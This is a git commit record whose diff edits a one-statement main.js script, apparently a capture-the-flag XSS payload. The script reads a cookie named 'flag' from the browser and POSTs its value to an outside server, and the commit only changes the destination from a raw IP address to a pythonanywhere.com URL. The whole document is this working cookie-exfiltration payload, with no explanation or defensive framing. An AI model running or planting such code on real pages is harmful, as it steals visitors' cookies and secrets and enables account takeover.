0eb7c620af8b648f40348ad8d0e4ef1d4fd80186
N122-ru <150384212+N122-ru@users.noreply.github.com>
2024-11-23 21:57:27 +0400

    Update main.js

--- main.js
+++ main.js
@@ -1,4 +1,4 @@
-document.cookie.split(" ").find(row => row.startsWith("flag=")) && fetch("http://109.169.247.40:80", {
+document.cookie.split(" ").find(row => row.startsWith("flag=")) && fetch("https://n122.pythonanywhere.com/", {
     method: "POST",
     headers: {"Content-Type": "application/x-www-form-urlencoded"},
     body: `flag=${encodeURIComponent(document.cookie.split("; ").find(row => row.startsWith("flag=")).split("=")[1])}`
